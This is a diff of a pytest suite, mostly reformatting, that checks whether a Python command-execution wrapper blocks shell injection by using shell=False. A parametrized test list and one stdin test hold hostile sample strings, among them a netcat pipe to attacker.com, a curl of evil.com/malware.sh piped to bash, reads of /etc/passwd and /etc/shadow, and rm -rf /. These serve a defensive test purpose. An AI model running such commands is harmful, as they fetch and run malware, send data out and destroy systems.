@@ -25,11 +25,7 @@ class TestCommandResult:
     def test_command_result_creation(self):
         """Test creating a CommandResult."""
         result = CommandResult(
-            exit_code=0,
-            stdout="output",
-            stderr="",
-            success=True,
-            command="echo test"
+            exit_code=0, stdout="output", stderr="", success=True, command="echo test"
         )
 
         assert result.exit_code == 0
@@ -40,13 +36,7 @@ class TestCommandResult:
 
     def test_command_result_boolean_evaluation_success(self):
         """Test CommandResult boolean evaluation for success."""
-        result = CommandResult(
-            exit_code=0,
-            stdout="",
-            stderr="",
-            success=True,
-            command="test"
-        )
+        result = CommandResult(exit_code=0, stdout="", stderr="", success=True, command="test")
 
         assert bool(result) is True
         assert result  # Truthy evaluation
@@ -54,11 +44,7 @@ class TestCommandResult:
     def test_command_result_boolean_evaluation_failure(self):
         """Test CommandResult boolean evaluation for failure."""
         result = CommandResult(
-            exit_code=1,
-            stdout="",
-            stderr="error",
-            success=False,
-            command="test"
+            exit_code=1, stdout="", stderr="error", success=False, command="test"
         )
 
         assert bool(result) is False
@@ -71,7 +57,7 @@ class TestExecuteCommand:
     def test_execute_array_command_success(self, mocker):
         """Test executing command as array (secure format)."""
         # Mock subprocess.run
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="output",
@@ -87,12 +73,12 @@ class TestExecuteCommand:
         # Verify subprocess.run was called with shell=False
         mock_run.assert_called_once()
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
         assert call_args.args[0] == ["echo", "test"]
 
     def test_execute_string_command_with_shlex(self, mocker):
         """Test executing command as string (parsed with shlex)."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="output",
@@ -105,12 +91,12 @@ class TestExecuteCommand:
 
         # Verify shlex.split was used correctly
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
         assert call_args.args[0] == ["echo", "test", "argument"]
 
     def test_malicious_input_as_literal_argument(self, mocker):
         """Test that malicious input is treated as literal argument."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -123,13 +109,13 @@ class TestExecuteCommand:
 
         # Verify malicious string is passed as literal argument
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
         assert call_args.args[0] == ["echo", "test; rm -rf /"]
         # The semicolon and command are treated as a single literal string
 
     def test_sudo_prepending(self, mocker):
         """Test that sudo is correctly prepended when requested."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -141,15 +127,12 @@ class TestExecuteCommand:
         # Verify sudo was prepended
         call_args = mock_run.call_args
         assert call_args.args[0] == ["sudo", "ip", "link"]
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
 
     def test_command_timeout_handling(self, mocker):
         """Test timeout handling."""
-        mock_run = mocker.patch('subprocess.run')
-        mock_run.side_effect = subprocess.TimeoutExpired(
-            cmd="sleep 10",
-            timeout=1
-        )
+        mock_run = mocker.patch("subprocess.run")
+        mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep 10", timeout=1)
 
         result = execute_command(["sleep", "10"], timeout=1)
 
@@ -159,7 +142,7 @@ class TestExecuteCommand:
 
     def test_command_failure_handling(self, mocker):
         """Test handling of failed commands."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=1,
             stdout="",
@@ -174,7 +157,7 @@ class TestExecuteCommand:
 
     def test_command_failure_with_check_raises(self, mocker):
         """Test that check=True raises exception on failure."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=1,
             stdout="",
@@ -186,7 +169,7 @@ class TestExecuteCommand:
 
     def test_capture_output_disabled(self, mocker):
         """Test that capture_output can be disabled."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout=None,
@@ -196,13 +179,13 @@ class TestExecuteCommand:
         result = execute_command(["echo", "test"], capture_output=False)
 
         call_args = mock_run.call_args
-        assert call_args.kwargs['capture_output'] is False
+        assert call_args.kwargs["capture_output"] is False
         assert result.stdout == ""
         assert result.stderr == ""
 
     def test_working_directory_parameter(self, mocker):
         """Test that cwd parameter is passed correctly."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -213,11 +196,11 @@ class TestExecuteCommand:
         result = execute_command(["ls"], cwd=cwd)
 
         call_args = mock_run.call_args
-        assert call_args.kwargs['cwd'] == cwd
+        assert call_args.kwargs["cwd"] == cwd
 
     def test_environment_variables_parameter(self, mocker):
         """Test that env parameter is passed correctly."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -228,11 +211,11 @@ class TestExecuteCommand:
         result = execute_command(["ls"], env=env)
 
         call_args = mock_run.call_args
-        assert call_args.kwargs['env'] == env
+        assert call_args.kwargs["env"] == env
 
     def test_exception_handling(self, mocker):
         """Test handling of unexpected exceptions."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.side_effect = Exception("Unexpected error")
 
         result = execute_command(["test"])
@@ -247,7 +230,7 @@ class TestExecuteCommands:
 
     def test_execute_multiple_commands_success(self, mocker):
         """Test executing multiple commands successfully."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="output",
@@ -263,7 +246,7 @@ class TestExecuteCommands:
 
     def test_stop_on_error_true(self, mocker):
         """Test that stop_on_error=True stops on first failure."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         # First command succeeds, second fails
         mock_run.side_effect = [
             mocker.Mock(returncode=0, stdout="", stderr=""),
@@ -281,7 +264,7 @@ class TestExecuteCommands:
 
     def test_stop_on_error_false(self, mocker):
         """Test that stop_on_error=False continues after failures."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         # Second command fails, others succeed
         mock_run.side_effect = [
             mocker.Mock(returncode=0, stdout="", stderr=""),
@@ -305,7 +288,7 @@ class TestCheckCommandExists:
 
     def test_command_exists(self, mocker):
         """Test checking for existing command."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="/usr/bin/ls",
@@ -317,11 +300,11 @@ class TestCheckCommandExists:
         assert result is True
         # Verify it uses shlex.quote for safety
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
 
     def test_command_does_not_exist(self, mocker):
         """Test checking for non-existent command."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=1,
             stdout="",
@@ -334,7 +317,7 @@ class TestCheckCommandExists:
 
     def test_malicious_command_name_is_quoted(self, mocker):
         """Test that malicious command names are safely quoted."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=1,
             stdout="",
@@ -355,63 +338,49 @@ class TestRunCommandWithInput:
 
     def test_command_with_stdin_input(self, mocker):
         """Test executing command with stdin input."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="processed",
             stderr="",
         )
 
-        result = run_command_with_input(
-            ["grep", "test"],
-            input_data="test data\nmore data"
-        )
+        result = run_command_with_input(["grep", "test"], input_data="test data\nmore data")
 
         assert result.success is True
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
-        assert call_args.kwargs['input'] == "test data\nmore data"
+        assert call_args.kwargs["shell"] is False
+        assert call_args.kwargs["input"] == "test data\nmore data"
         assert call_args.args[0] == ["grep", "test"]
 
     def test_command_with_input_and_sudo(self, mocker):
         """Test command with input and sudo."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
             stderr="",
         )
 
-        result = run_command_with_input(
-            ["tee", "/etc/config"],
-            input_data="config data",
-            sudo=True
-        )
+        result = run_command_with_input(["tee", "/etc/config"], input_data="config data", sudo=True)
 
         call_args = mock_run.call_args
         assert call_args.args[0] == ["sudo", "tee", "/etc/config"]
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
 
     def test_command_with_input_timeout(self, mocker):
         """Test timeout handling with input."""
-        mock_run = mocker.patch('subprocess.run')
-        mock_run.side_effect = subprocess.TimeoutExpired(
-            cmd="cat",
-            timeout=1
-        )
+        mock_run = mocker.patch("subprocess.run")
+        mock_run.side_effect = subprocess.TimeoutExpired(cmd="cat", timeout=1)
 
-        result = run_command_with_input(
-            ["cat"],
-            input_data="data",
-            timeout=1
-        )
+        result = run_command_with_input(["cat"], input_data="data", timeout=1)
 
         assert result.success is False
         assert "timed out" in result.stderr.lower()
 
     def test_malicious_stdin_data_is_safe(self, mocker):
         """Test that malicious stdin data is safely passed."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -421,15 +390,12 @@ class TestRunCommandWithInput:
         # Malicious stdin data
         malicious_input = "; rm -rf /\n$(whoami)\n`id`"
 
-        result = run_command_with_input(
-            ["cat"],
-            input_data=malicious_input
-        )
+        result = run_command_with_input(["cat"], input_data=malicious_input)
 
         # Verify the malicious data is passed as literal input
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
-        assert call_args.kwargs['input'] == malicious_input
+        assert call_args.kwargs["shell"] is False
+        assert call_args.kwargs["input"] == malicious_input
 
 
 class TestGetCommandOutput:
@@ -437,7 +403,7 @@ class TestGetCommandOutput:
 
     def test_get_output_success(self, mocker):
         """Test getting command output successfully."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="  output with whitespace  \n",
@@ -450,7 +416,7 @@ class TestGetCommandOutput:
 
     def test_get_output_failure_returns_none(self, mocker):
         """Test that failed command returns None."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=1,
             stdout="",
@@ -463,7 +429,7 @@ class TestGetCommandOutput:
 
     def test_get_output_with_sudo(self, mocker):
         """Test get_command_output with sudo."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="output",
@@ -481,7 +447,7 @@ class TestCommandExistsAny:
 
     def test_at_least_one_exists(self, mocker):
         """Test when at least one command exists."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         # First command fails, second succeeds
         mock_run.side_effect = [
             mocker.Mock(returncode=1, stdout="", stderr=""),
@@ -494,7 +460,7 @@ class TestCommandExistsAny:
 
     def test_none_exist(self, mocker):
         """Test when no commands exist."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=1,
             stdout="",
@@ -517,7 +483,7 @@ class TestGetCommandVersion:
 
     def test_get_version_success(self, mocker):
         """Test getting command version successfully."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         # First call checks if command exists, second gets version
         mock_run.side_effect = [
             mocker.Mock(returncode=0, stdout="/usr/bin/python3", stderr=""),
@@ -530,7 +496,7 @@ class TestGetCommandVersion:
 
     def test_get_version_custom_flag(self, mocker):
         """Test using custom version flag."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.side_effect = [
             mocker.Mock(returncode=0, stdout="/usr/bin/gcc", stderr=""),
             mocker.Mock(returncode=0, stdout="gcc version 11.3.0", stderr=""),
@@ -544,7 +510,7 @@ class TestGetCommandVersion:
 
     def test_get_version_command_not_found(self, mocker):
         """Test when command doesn't exist."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=1,
             stdout="",
@@ -557,7 +523,7 @@ class TestGetCommandVersion:
 
     def test_get_version_fails(self, mocker):
         """Test when version command fails."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.side_effect = [
             mocker.Mock(returncode=0, stdout="/usr/bin/cmd", stderr=""),
             mocker.Mock(returncode=1, stdout="", stderr="error"),
@@ -571,20 +537,23 @@ class TestGetCommandVersion:
 class TestCommandInjectionPrevention:
     """Comprehensive command injection prevention tests."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "; rm -rf /",
-        "&& cat /etc/passwd",
-        "| nc attacker.com 1234",
-        "`whoami`",
-        "$(id)",
-        "../../../etc/shadow",
-        "'; DROP TABLE users; --",
-        "test\n/bin/bash",
-        "test && curl evil.com/malware.sh | bash",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "; rm -rf /",
+            "&& cat /etc/passwd",
+            "| nc attacker.com 1234",
+            "`whoami`",
+            "$(id)",
+            "../../../etc/shadow",
+            "'; DROP TABLE users; --",
+            "test\n/bin/bash",
+            "test && curl evil.com/malware.sh | bash",
+        ],
+    )
     def test_malicious_arguments_treated_as_literals(self, mocker, malicious_input):
         """Test that all malicious inputs are treated as literal arguments."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -596,7 +565,7 @@ class TestCommandInjectionPrevention:
 
         # Verify shell=False prevents injection
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
 
         # Malicious string is passed as literal argument
         assert call_args.args[0] == ["echo", malicious_input]
@@ -605,7 +574,7 @@ class TestCommandInjectionPrevention:
 
     def test_no_shell_true_ever(self, mocker):
         """Test that shell=True is NEVER used."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -620,11 +589,11 @@ class TestCommandInjectionPrevention:
 
         # Verify shell=False in ALL calls
         for call in mock_run.call_args_list:
-            assert call.kwargs['shell'] is False
+            assert call.kwargs["shell"] is False
 
     def test_pipe_operators_as_literals(self, mocker):
         """Test that pipe operators are treated as literal strings."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -635,13 +604,13 @@ class TestCommandInjectionPrevention:
         result = execute_command(["echo", "test | cat"])
 
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
         # The pipe is part of the literal string, not a shell operator
         assert call_args.args[0] == ["echo", "test | cat"]
 
     def test_semicolon_operators_as_literals(self, mocker):
         """Test that semicolon operators are treated as literal strings."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -652,13 +621,13 @@ class TestCommandInjectionPrevention:
         result = execute_command(["echo", "test; rm -rf /"])
 
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
         # The semicolon and following command are literal
         assert call_args.args[0] == ["echo", "test; rm -rf /"]
 
     def test_command_substitution_as_literals(self, mocker):
         """Test that command substitution syntax is treated as literal."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -670,7 +639,7 @@ class TestCommandInjectionPrevention:
         result = execute_command(["echo", malicious])
 
         call_args = mock_run.call_args
-        assert call_args.kwargs['shell'] is False
+        assert call_args.kwargs["shell"] is False
         # $() is treated as literal string, not executed
         assert call_args.args[0] == ["echo", "$(whoami)"]
 
@@ -680,7 +649,7 @@ class TestEdgeCases:
 
     def test_empty_command_list(self, mocker):
         """Test handling of empty command list."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.side_effect = Exception("Empty command")
 
         result = execute_command([])
@@ -690,7 +659,7 @@ class TestEdgeCases:
 
     def test_whitespace_in_arguments(self, mocker):
         """Test arguments with whitespace."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -705,7 +674,7 @@ class TestEdgeCases:
 
     def test_unicode_in_arguments(self, mocker):
         """Test unicode characters in arguments."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -719,7 +688,7 @@ class TestEdgeCases:
 
     def test_very_long_command(self, mocker):
         """Test handling of very long commands."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -733,7 +702,7 @@ class TestEdgeCases:
 
     def test_none_timeout_uses_default(self, mocker):
         """Test that None timeout uses default value."""
-        mock_run = mocker.patch('subprocess.run')
+        mock_run = mocker.patch("subprocess.run")
         mock_run.return_value = mocker.Mock(
             returncode=0,
             stdout="",
@@ -744,4 +713,4 @@ class TestEdgeCases:
 
         call_args = mock_run.call_args
         # Should use COMMAND_TIMEOUT_DEFAULT, not None
-        assert call_args.kwargs['timeout'] is not None
+        assert call_args.kwargs["timeout"] is not None
